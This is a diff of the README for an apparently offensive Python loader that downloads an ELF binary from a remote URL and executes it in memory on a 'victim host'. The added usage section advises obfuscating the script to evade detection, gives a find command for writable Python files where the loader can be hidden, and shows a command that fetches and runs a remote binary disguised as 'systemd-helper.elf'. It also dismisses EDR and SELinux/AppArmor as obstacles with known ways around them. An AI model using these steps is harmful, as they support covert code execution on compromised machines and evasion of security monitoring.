@@ -13,7 +13,7 @@ A target ELF binary, is downloaded from a remote URL using ```urllib.request```a
 Lastly, a new process is spawned by calling ```os.fork``` and subsequently calling```os.execve()```to directly load the binary from memory into the new process and execute it.
 
 # Limitations
-You shouldn't have any issues running it as a regular user, since ```os.fork()``` will create a process that is an exact same copy of the parent loader, and inherit the same UID, GID, and privs. However, you might run into some prevention methodology. I don't want to get into the heuristics of all of the detection mechanisms in place that can stop this from working, as it might affect my other loaders. However, keep in mind that EDR is now the main limitation. In some cases there *could* be AppArmor/SELinux rules that prevent this from running, but ya know - there's ways around that.
+You shouldn't have any issues running it as a regular user, since ```os.fork()``` will create a process that is an exact same copy of the parent loader, and inherit the same UID, GID, and privs. Additionally, this is only going to be a good as your ELF - no matter how you may rework this loader. However, you might run into some prevention methodology. I don't want to get into the heuristics of all of the detection mechanisms in place that can stop this from working, as it might affect my other loaders. Keep in mind that EDR is now the main limitation. In some cases there *could* be AppArmor/SELinux rules that prevent this from running, but ya know - there are always ways around that.
 
 # OS Support (Tested)
 - Ubuntu 20.04, 22.04
@@ -27,4 +27,12 @@ You shouldn't have any issues running it as a regular user, since ```os.fork()``
 - Probably if you're running inside of Docker, LXC, or Kubernetes.
 
 ## Usage
-The utilization of the script is very simple.
+1. Before you do any of this, please ensure that you have outbound on the victim host, since you're pulling a remote URL (obv). If you can, I'd recommend first pulling this down somewhere you can edit it [basically I don't recommend cloning this repo onto the victim host direct]. Take out the ASCII, modify print strings, change variable names, etc. Basically, obfuscate.<br><br>
+```git clone https://github.com/johnjhacking/bloudstrike```<br>
+```nano bloudstrike.py```<br>
+<--make your edits and save--><br><br>
+2. If you have TTY, you can easily just make the script while on the host. I'll leave the "where to put it" to your best discretion, reminding you that it'll be the parent execution process that shows in a proclist. I mean...a lot of ways to fry a fish.<br>
+```find / -type f -name "*.py" \( -perm -u=w -o -perm -g=w -o -perm -o=w \) 2>/dev/null```<br>
+3. Host the ELF file on a domain. Chmod the loader and execute.<br>
+```chmod +x whatever.py```<br>OR if you went the find route, simply execute.<br>
+4. ```python3 whatever.py -u http://example.com/systemd-helper.elf```
